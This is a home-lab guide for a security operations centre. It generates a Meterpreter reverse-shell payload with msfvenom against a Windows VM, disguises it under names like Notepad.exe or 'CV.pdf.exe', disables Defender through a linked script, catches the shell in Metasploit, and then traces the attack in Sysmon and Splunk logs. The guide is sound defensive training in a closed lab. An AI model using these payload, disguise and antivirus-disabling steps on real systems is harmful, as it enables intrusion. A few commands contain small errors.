# SOC Home Lab Guide

---
## Downloading Prerequisits
### VMWare | Windows 10/11 | Kali Linux VMs | Sysmon | Splunk Enterprise | Powershell Scripts  
[VMware](https://www.techpowerup.com/download/vmware-workstation-pro/)  
[Windows 10](https://www.microsoft.com/en-gb/software-download/windows10)
[Windows 11](https://www.microsoft.com/en-gb/software-download/windows11)  
[Kali Linux](https://cdimage.kali.org/kali-2026.1/kali-linux-2026.1-vmware-amd64.7z)  
[Sysmon](https://download.sysinternals.com/files/Sysmon.zip)  
[Sysmon Config](https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml)  
[Splunk Enterprise](https://www.splunk.com/en_us/download/splunk-enterprise.html)  
[inputs.conf](https://github.com/Trn44/SOC-Home-Lab/raw/main/inputs.conf)  
[Sysmon Install PowerShell Script](https://github.com/Trn44/SOC-Home-Lab/raw/main/Sysmon.ps1)  
[Windows Defender Disable Powershell Script](https://github.com/Trn44/SOC-Home-Lab/raw/main/Defender.ps1)

---
## Installing VMs | Splunk Setup| Sysmon Setup
- Download Windows ISO, Kali Linux VM  
Install Windows VM from created ISO file.  
Extract Kali Linux Zip and Import VM.  

- Copy & paste Splunk Enterprise Installer to Windows VM.  
Install Splunk Enterprise from MSI installer to VM.  
- Download [inputs.conf](https://github.com/Trn44/SOC-Home-Lab/raw/main/inputs.conf)  
Copy, paste inputs.conf into the Splunk directory for collecting sysmon logs "C:\Program Files\Splunk\etc\system\local".  

- Copy & paste Sysmon, Sysmon Config to VM.  
Unzip Sysmon folder, copy and paste sysmonconfig.xml into directory where Sysmon64.exe is located.  
Download [Sysmon Install PowerShell Script](https://github.com/Trn44/SOC-Home-Lab/raw/main/Sysmon.ps1) and copy, paste into Sysmon root folder to 1 click install Sysmon.

---
## Creating Closed Local Virtual Network Environment
- Open VMWare's Virtual Machine Settings for both Windows & Kali Linux.
- Select "Network Adapter", under "Network Connection" select "LAN Segment".
- Click the "LAN Segments..." Button below and add a new LAN with desired name.
- Select Newly created LAN network under the drop down menu on "LAN Segment:".

---
## Asigning IP Addresses & Verifying Network
- On Windows 10/11:  
Right-click the globe in system tray, Open Network & Internet Settings  
Click Change adapter options  
Right click the network adapter, Properties  
Select Internet Protocol Version 4 (TCP/IPv4), Properties  
Select Use the following IP address  
Create an IP Address of your choosing, example: 192.168.0.100  
Click OK  
Open CMD/PowerShell, type ipconfig to verify IP.

- On Kali Linux:  
Click the Ethernet icon in top right  
Select Edit Connections, select the wired connection  
Double click the network adpater, go to IPv4 Settings   
Set Method to Manual  
Click Add under Addresses:  
Create an IP Address of your choosing, example: 192.168.0.200   
Netmask: 24  
Click Save  
Open terminal, type ifconfig to verify IP.

- Windows:  
In CMD/PowerShell type ping 192.168.0.200 (Your selected IP for Kali).  
- Kali Linux:  
In terminal type ping 192.168.0.100 (Your selected IP for Windows).

---
## Generating Payload
- Using msfvenom on Kali Linux  
To list all avaliable payloads we can type "msfvenom -l payloads" into the terminal.  
The payload used in this SOC lab is "windows/x64/meterpreter_reverse_tcp".  
We will generate a reverse TCP shellcode from our Windows VM to Kali VM.  
In the Kali terminal we can use "msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.0.200 lport=4444 -f exe -o Notepad.exe".  
LHOST = The IP address of your Kali VM, Notepad.exe is our generated filename which can be any name of your choosing eg CV.pdf.exe.  
<img width="728" height="232" alt="image" src="https://github.com/user-attachments/assets/803f1157-5acb-4880-9490-5e3e998b0105" />

---
## Windows Defender
- In order to use msfvenom payloads on our Windows VM we must disable Windows Defender.  
Using msfvenom without obfuscation of our payload will be easily detected by antivirus software.  
For the simplicity and learning of payload functions and detections I will not attempt to obfuscate or evade antivirus.  
On our Windows VM, using the [Defender](https://github.com/Trn44/SOC-Home-Lab/raw/main/Defender.ps1) PowerShell script we can 1 click disable all Windows Defender components.  
Disabling defender when simulating an attack in a closed LAN environment is safe as we are not open to any vulnerabilities which can be used over an open network connection, only our own attacks.  
- I DO NOT RECOMMEND YOU RUN THE SCRIPT ON YOUR DAILY/MAIN WINDOWS INSTALL.

---
## Opening Metasploit listener
- Using Metasploit we can set our Kali VM to be the listener for our payload to generate our reverse tcp shellcode and recieve information from our Windows VM.  
In the terminal we can type "msfconsole" to load Metasploit.  
Next we can setup a multi handler through the command "user exploit/multi/handler".  
The defualt payload option is set to generic/shell_reverse_tcp, to change it we can use "set payload windows/x64/meterpreter/reverse_tcp" to match our payload type we previously generated in Notepad.exe.  
Setting the lhost to our Kali VM IP is required in order to recieve the reverse TCP shell back from the Windows VM, we do this through the command "set lhost 192.168.0.200".  
To check the setup we can use "options" to view our changes.
Lastly, to launch our reverse TCP listener we can type "exploit" into the terminal to start the handler on our Kali VM IP and our selected port number of 4444.
<img width="793" height="518" alt="image" src="https://github.com/user-attachments/assets/cebac611-27d5-4fdb-9f5a-a6eee70b96f1" />

---
## Sending the payload to our Windows VM
- To send our payload we can use a HTTP server on Python.  
On our Kali VM terminal we can type "python3 -m http.server 8888" using any unused port.  
On our Windows VM, open a browser and type "http://192.168.0.200:8888" to access the web server where the payload is being hosted and download it. We should be able to see on our Kali VM the IP of our Windows VM connecting to our server and downloading the file.
<img width="520" height="107" alt="image" src="https://github.com/user-attachments/assets/fe131ab4-b4d4-4c6c-8b3b-7f256048492a" />
<img width="913" height="313" alt="image" src="https://github.com/user-attachments/assets/68f1ca46-aacf-43a1-99d9-4417ff02273d" />

---
## Running the payload & Confirming connectivity
- Run the payload file on our Windows machine and open a PowerShell terminal as admin.  
Typing "netstat -anob" in PowerShell we can confirm our connection was successful if we see the Application with the payload Notepad.exe and an ESTABLISHED connection to the Kali VM's IP/Port number.  
Inside our Windows VM task manager, we can see that Notepad.exe is running in the background, matching the process ID 7220 with the listed one in PowerShell.
<img width="540" height="26" alt="image" src="https://github.com/user-attachments/assets/a339d35e-ac4d-4a7c-8da9-bcb1d3657db4" />
<img width="549" height="19" alt="image" src="https://github.com/user-attachments/assets/200e880d-0b5a-4e60-a7e7-eab8ee887484" />

- On Kali, we can type "shell" into our metaploit terminal and confirm access to the Windows machine, I checked using "ipconfig" and "net user".
<img width="641" height="505" alt="image" src="https://github.com/user-attachments/assets/6c6ffb7c-fc5e-42d8-a9d6-2a5c4357e198" />


- On Windows we can verify the activity through the Splunk logs and Sysmon logs.  
We can see that Sysmon logs forwarded to Splunk show our payload source Notepad.exe and target cmd.exe through the use of DLL injection creating the reverse TCP shellcode. The destination IP address of our Kali machine can also be indentified with 192.168.0.200 and port number 4444.  
<img width="1537" height="752" alt="image" src="https://github.com/user-attachments/assets/5228c99a-5425-4a21-a453-8d198dc3851c" />
<img width="595" height="591" alt="image" src="https://github.com/user-attachments/assets/26607cfe-3a6b-452d-bb9f-8d55d3a7bd48" />
<img width="1424" height="798" alt="image" src="https://github.com/user-attachments/assets/82d63bb6-17e5-4ac5-819a-05a227bd4617" />

- Checking Sysmon logs inside of the Windows event viewer show our Windows VM opening the Notepad.exe process spawning a cmd.exe process, leading to the DLL injection and execution of our "net user" command from our Kali machine.
<img width="1173" height="731" alt="image" src="https://github.com/user-attachments/assets/56341f80-0e80-4e65-878e-3f0551b8ed51" />
<img width="1181" height="733" alt="image" src="https://github.com/user-attachments/assets/b526cc3f-52bb-49a1-a62a-9c55bdbfbad6" />
<img width="1171" height="728" alt="image" src="https://github.com/user-attachments/assets/de936311-8e35-426a-9165-a5df602f48b1" />

---
## Completion | Review
- Successfully simulating a basic reverse shellcode injection attack from our Kali VM to Windows VM, we identified the source of our attack and the actions that were performed with the documentation of the event ID's and Task Category we can see: 1 = Process Creation, 10 = Process Access was used by the attacker. The logs identified the source of the attack being Notepad.exe in the Downloads folder and our destination was to the Kali VM at 192.168.0.200 port 4444.